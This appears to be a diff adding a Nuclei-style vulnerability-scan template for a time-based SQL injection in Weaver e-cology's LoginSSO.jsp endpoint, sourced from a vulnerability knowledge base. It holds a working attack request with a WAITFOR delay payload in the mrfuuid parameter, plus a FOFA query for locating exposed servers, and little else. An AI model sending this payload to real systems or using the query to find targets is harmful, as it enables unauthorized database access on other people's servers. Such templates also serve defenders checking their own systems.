@@ -1,0 +1,19 @@
+id: poc-qp8n2gxg13ik5rim
+info:
+  name: 泛微e-cology FileDownload LoginSSO存在 SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qp8n2gxg13ik5rim'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qp8n2gxg13ik5rim
+    fofa: body="doCheckPopupBlocked"
+http:
+- raw:
+  - GET /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mrfuuid=1%27;if+db_name(1)=%27master%27+WAITFOR+delay+%270:0:5%27--+&mailid=0&a=.swf HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
